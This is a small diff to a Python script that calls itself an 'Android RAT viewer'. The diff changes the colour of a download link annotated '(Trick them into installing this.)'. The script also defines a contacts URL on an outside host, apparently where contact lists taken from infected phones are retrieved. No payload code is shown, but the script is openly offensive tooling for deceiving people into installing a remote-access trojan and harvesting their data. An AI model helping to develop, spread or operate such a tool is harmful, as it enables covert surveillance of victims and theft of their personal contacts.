@@ -6,7 +6,7 @@ GREEN = "\033[32m"
 BLUE = "\033[34m"
 RESET = "\033[0m"
 version = "v0.1"
-ar_link = "https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.)"
+ar_link = f"{GREEN}https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.){RESET}"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
